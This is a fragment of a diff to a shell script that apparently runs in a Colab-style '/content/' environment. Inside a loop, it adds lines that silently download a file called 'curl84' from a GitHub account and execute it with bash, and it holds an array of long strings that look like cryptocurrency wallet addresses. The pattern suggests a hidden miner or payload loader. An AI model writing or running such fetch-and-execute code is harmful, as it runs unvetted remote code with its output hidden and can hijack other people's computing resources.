@@ -17,15 +17,9 @@ else
 while true
 do
 
-pkill -f curl84
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
 
-pkill -f curl84
-
-pkill -f curl84
-
-pkill -f curl84
-
-curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+bash ./curl84 &> /dev/null &
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -66,15 +60,9 @@ fi
 
 else
 
-pkill -f curl84
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
 
-pkill -f curl84
-
-pkill -f curl84
-
-pkill -f curl84
-
-curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+bash ./curl84 &> /dev/null &
 
 cd /content/
 
